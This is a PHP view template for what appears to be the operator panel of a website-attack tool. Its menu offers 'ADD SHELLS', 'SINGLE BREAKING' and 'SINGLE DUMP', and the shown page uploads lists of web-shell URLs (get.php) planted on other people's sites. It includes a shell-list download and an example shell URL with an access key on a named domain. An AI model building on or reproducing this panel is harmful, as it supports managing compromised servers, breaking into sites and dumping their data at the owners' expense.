<!-- START CONTENT -->
<div id="content">

<ul class="page-nav fl">
<li ><?=$html->link('STATE',array('action'=>'mailinfo')); ?></li>
<li ><?=$html->link('ADD LINKS',array('action'=>'add')); ?></li>
<li ><?=$html->link('ADD DOMENS',array('action'=>'add_domens')); ?></li>
<li class="active"><?=$html->link('ADD SHELLS',array('action'=>'add_shells')); ?></li>
<li ><?=$html->link('SINGLE BREAKING',array('action'=>'add_one')); ?></li>
<li><?=$html->link('SINGLE DUMP',array('action'=>'dumping_all')); ?></li>
</ul>

<div class="clear"></div>
<table class="table">
<thead>
<th>ADD SHELLS</th>
</thead>
<tbody>
<tr>
<td>
<label for="hash">Specify the path to the file which contains the links with the files to build on the shell get.php:</label><br>
File to build <a href="/get.txt">Download</a>
<br>
<br><br>
Shells are overwritten !!! Therefore, take the old even if needed <a href="/shelllist.txt">shelllist.txt</a> and paste into your file.
<br>
<br><br>
The format of the links added to the system is any:
<br><span style="color:red">dgpacific.com/62acm.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG</span>
<br> <span style="color:red">site.ru/get.php </span>
<br><span style="color:red">http://site.ru/get.php </span>
<br><br>one url per line in the file.

<?=$form->create('Post',array('type'=>'file'))?>
<?=$form->input('file',array('type'=>'file', 'class'=>'input','div'=>false,'label'=>false))?>
<?  $options = array('1' => 'Overwrite', '2' => 'Add');?>
<?=$form->select('type', $options, array('default' => '1'));?>
<?=$form->submit('ADD', array('name'=>'hash','class'=>'btn btn_green','div'=>false))?>
<?=$form->end()?>
<br/>
<span class="comment red">Valid encoding of .txt files UTF-8</span>
</td>
</tr>
</tbody>
</table>
</div>
<!-- STOP CONTENT -->